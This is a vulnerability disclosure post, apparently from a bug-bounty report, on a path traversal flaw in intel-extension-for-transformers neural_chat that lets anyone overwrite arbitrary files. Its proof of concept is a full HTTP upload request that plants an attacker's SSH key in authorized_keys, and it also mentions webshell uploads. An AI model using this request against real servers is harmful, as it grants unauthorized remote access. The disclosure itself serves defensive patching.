---
layout: post
title:  "Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in intel-extension-for-transformers neural_chat"
date:  2024-05-27 10:31:06 +0800
categories: file-overwrite
---

## Name

> Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in intel-extension-for-transformers neural_chat.


## Weakness

> CWE-22: Path Traversal

## Severity

> High (8.8)

## Version

> v1.4.2

## Description

The post route [`/v1/askdoc/upload_files`](https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L296) endpoint in intel-extension-for-transformers [neural_chat](https://github.com/intel/intel-extension-for-transformers/tree/main/intel_extension_for_transformers/neural_chat#introduction) is vulnerable to a path traversal vulnerability through the `file_paths` parameter which allows the uploading of arbitrary files. The [`file_path`](https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L308C32-L308C42) is directly append to a directory path [without sanitization](https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319) and the file content is writen to dest location. An attacker can upload and overwrite **ANY** file on the filesystem. This can lead to remote code execution in many different ways.

The vulnerable function [`retrieval_add_files`](https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L296C11-L296C30):

```
@router.post("/v1/askdoc/upload_files")
async def retrieval_add_files(request: Request,
                           files: List[UploadFile] = File(...),
                           file_paths: List[str] = Form(...),
                           knowledge_base_id: str = Form(...)):
    ...
    for file_path, file in zip(file_paths, files):
        filename = file.filename
        if '/' in filename:
            filename = filename.split('/')[-1]
        logger.info(f"[askdoc - upload_files] received file: {filename}, kb_id: {kb_id}")
        user_id = request.client.host
        logger.info(f'[askdoc - upload_files] user id: {user_id}')

        path_prefix = get_path_prefix(kb_id, user_id)
        upload_path = path_prefix + '/upload_dir'
        persist_path = path_prefix + '/persist_dir'
        save_path = Path(upload_path) / file_path
        save_path.parent.mkdir(parents=True, exist_ok=True)

        # save file content to local disk
        await save_file_to_local_disk(save_path, file)
```

## Proof of Concept

In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the `authorized_keys` file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, ....

We proof this vulnerability by logging into the `kali` user running the neural_chat service and checking that at this moment the `/home/kali/.ssh/authorized_keys` file does not exist.

```
kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
cat: /home/kali/.ssh/authorized_keys: No such file or directory
```

An attacker can now send the following request to the webserver. This request will upload the attacker's public RSA key to the `authorized_keys` file.

We start a default neural_chat server following tutorial from [https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation](https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation):

```
# Install system requirements
sudo apt-get update
sudo apt-get install -y python3-pip
sudo apt-get install -y libgl1-mesa-glx

# clone the project
git clone https://github.com/intel/intel-extension-for-transformers.git
cd intel-extension-for-transformers/intel_extension_for_transformers/neural_chat/

# Install python requirements
pip install -r requirements_cpu.txt
pip install fastapi==0.103.2
pip install intel-extension-for-transformers
```

Start neural_chat server, the service is open at `0.0.0.0:8000`

```
# start neural_chat server, it will download model from internet for first time, be patient.
neuralchat_server start --config_file ./server/config/neuralchat.yaml
```

Send follow post request to the server using burpsuite:

```
POST http://10.15.0.5:8000/v1/askdoc/upload_files HTTP/1.1
Host: 10.15.0.5:8000
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvIlRA9q70krSRDb7
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
Cookie: 
Connection: close
Content-Length: 409

------WebKitFormBoundaryvIlRA9q70krSRDb7
Content-Disposition: form-data; name="knowledge_base_id"

123
------WebKitFormBoundaryvIlRA9q70krSRDb7
Content-Disposition: form-data; name="files"; filename="blob"
Content-Type: text/plain

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
------WebKitFormBoundaryvIlRA9q70krSRDb7
Content-Disposition: form-data; name="file_paths"

/home/kali/.ssh/authorized_keys
------WebKitFormBoundaryvIlRA9q70krSRDb7--
```

The response indicates error but the file is written successfully.

```
HTTP/1.1 200 OK
Content-Length: 39
Connection: keep-alive
Content-Type: application/json
Date: Mon, 27 May 2024 07:41:53 GMT
Keep-Alive: timeout=4
Proxy-Connection: keep-alive
Server: uvicorn

"Error occurred while uploading files."
```

We can verify the success by again checking the `/home/kali/.ssh/authorized_keys` file.

```
kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
```

## Impact

This vulnerability can have severe consequences. This section will highlight some tangible impact.


### SSH Access

On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.

### Web Servers

On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)


## Reference

[https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e](https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e)

## Occurrences

[https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319](https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319)

